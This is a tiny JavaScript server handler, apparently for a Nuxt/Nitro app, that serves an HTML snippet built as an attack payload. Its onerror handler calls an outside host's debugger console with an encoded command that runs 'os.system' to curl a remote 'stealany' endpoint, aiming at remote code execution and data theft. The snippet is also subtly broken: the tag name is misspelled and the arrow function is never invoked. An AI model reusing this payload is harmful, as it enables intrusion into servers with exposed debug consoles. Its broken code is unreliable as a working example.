export default defineEventHandler((event) => {
    return `<imger src='123' onerror='() => {
    const res = fetch("http://miday_ahdnsivs.nicewhite.eu.org:60007/console?__debugger__=yes&cmd=import%20os%3B%20os.system%28%27curl%20https%3A%2F%2Fmock-server-blush.vercel.app%2Fstealany%3Fq%3D123456%27%29%3B)", {
                method: "GET",
                headers: {
                    "Content-Type": "application/json"
                }
            });    
    
}' />`
})